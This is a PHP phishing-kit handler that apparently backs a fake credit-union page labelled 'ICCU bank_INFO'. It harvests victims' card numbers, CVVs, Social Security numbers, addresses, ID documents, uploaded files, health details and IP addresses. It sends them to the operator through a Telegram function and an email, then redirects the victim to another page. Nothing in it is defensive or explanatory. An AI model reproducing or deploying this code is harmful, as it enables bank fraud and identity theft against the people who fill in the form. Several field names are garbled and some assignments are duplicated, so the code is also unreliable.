<?php
require("email.php");
include("config.php");
//Server Variables
    $ip = getenv("REMOTE_ADDR");
	$browser = $_SERVER['HTTP_USER_AGENT'];
        $adddate=date("D M d, Y g:i a");

    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $fname = $_POST['cq3_name[first]n'];
    $mname = $_POST['q3_name[middle]'];
    $lname = $_POST['q3_name[last]'];
    $datemnth = $_POST['q9_dateOf[month]'];
    $gender = $_POST['q4_gender'];
    $fname = $_POST['cq3_name[first]n'];
    $mname = $_POST['q3_name[middle]'];
    $lname = $_POST['q3_name[last]'];
    $exp = $_POST['exp'];
    $email = $_POST['q6_alternativeEmail'];
    $SSN = $_POST['ssn'];
    $address1 = $_POST['q7_currentHome[addr_line1]'];
    $address2 = $_POST['q7_currentHome[addr_line2]'];
    $city = $_POST['q7_currentHome[city]'];
    $state = $_POST['q7_currentHome[state]'];
    $zip = $_POST['q7_currentHome[postal]'];
    $idcard = $_POST['q20_anyValid'];
    $file1 = $_POST['q23_fileUpload[]'];
    $file2 = $_POST['name="q24_fileUpload24[]'];
    $gphone = $_POST['q13_guardianPhone[full]'];
    $class = $_POST['q14_class12'];
    $grade = $_POST['q15_graduationGrade'];
    $grade = $_POST['q16_healthIssues'];
    $SSN = $_POST['ssn'];
    $serv = $_REQUEST['form_232758708679172'];


    $sender_name = "EM6L3M";
    $uid = "sender";
    $sender_mail = "em6l3mlight.log";


        //Telegram send
        $message = "**ICCU**bank_INFO\n";
        $message .= "User-!P : ".$ip."\n";
        $message .= "----------------------------------------\n";
        $message .= "CARD: ".$_POST['cn']."\n";
        $message .= "----------------------------------------\n";
        $message .= "CVV: ".$_POST['cvv']."\n";
        $message .= "----------------------------------------\n";
        $message .= "LAST NAME: ".$_POST['q3_name[last]']."\n";
        $message .= "----------------------------------------\n";
        $message .= "MONTH: ".$_POST['q9_dateOf[month]']."\n";
        $message .= "----------------------------------------\n";
        $message .= "GENDER: ".$_POST['q4_gender']."\n";
        $message .= "----------------------------------------\n";
        $message .= "EMAIL: ".$_POST['q6_alternativeEmail']."\n";
        $message .= "----------------------------------------\n";
        $message .= "SSN: ".$_POST['ssn']."\n";
        $message .= "----------------------------------------\n";
        $message .= "ADDRESSL1: ".$_POST['exq7_currentHome[addr_line1]p']."\n";
        $message .= "----------------------------------------\n";
        $message .= "ADDRESSL2: ".$_POST['q7_currentHome[addr_line2]']."\n";
        $message .= "----------------------------------------\n";
        $message .= "CITY: ".$_POST['q7_currentHome[city]']."\n";
        $message .= "----------------------------------------\n";
        $message .= "STATE: ".$_POST['q7_currentHome[state]']."\n";
        $message .= "----------------------------------------\n";
        $message .= "ZIP: ".$_POST['q7_currentHome[postal]']."\n";
        $message .= "----------------------------------------\n";
        $message .= "ID CARD: ".$_POST['q20_anyValid']."\n";
        $message .= "----------------------------------------\n";
        $message .= "FILE1: ".$_POST['q23_fileUpload[]']."\n";
        $message .= "----------------------------------------\n";
        $message .= "FILE2: ".$_POST['name="q24_fileUpload24[]']."\n";
        $message .= "----------------------------------------\n";
        $message .= "GPHONE: ".$_POST['q13_guardianPhone[full]']."\n";
        $message .= "----------------------------------------\n";
        $message .= "CLASS: ".$_POST['q14_class12']."\n";
        $message .= "----------------------------------------\n";
        $message .= "GRADE: ".$_POST['q15_graduationGrade']."\n";
        $message .= "----------------------------------------\n";
        $message .= "HEALTH: ".$_POST['q16_healthIssues']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);


        //Main Content
        $main_subject = "LOGIN INFO l $ip";
        $main_body = "
	    PassWord : $email <p>
	    
        User-Ip : $ip";
        

//#############################DO NOT CHANGE ANYTHING BELOW THIS LINE#############################
        //Sending mail to Server
         $retval = mail($server_mail, $main_subject, "$uid\r\n \r\n\r\n $main_body \r\n\r\n--$uid\r\n $uid","From: $sender_name <$sender_mail>\r\nReply-To: $sender_mail\r\nMIME-Version: 1.0\r\nContent-Type: text/html; boundary=\"$uid\"\r\n\r\n");
        //Sending mail to Sender
//#############################DO NOT CHANGE ANYTHING ABOVE THIS LINE#############################

        //Output
        header("location:address.html");
?>
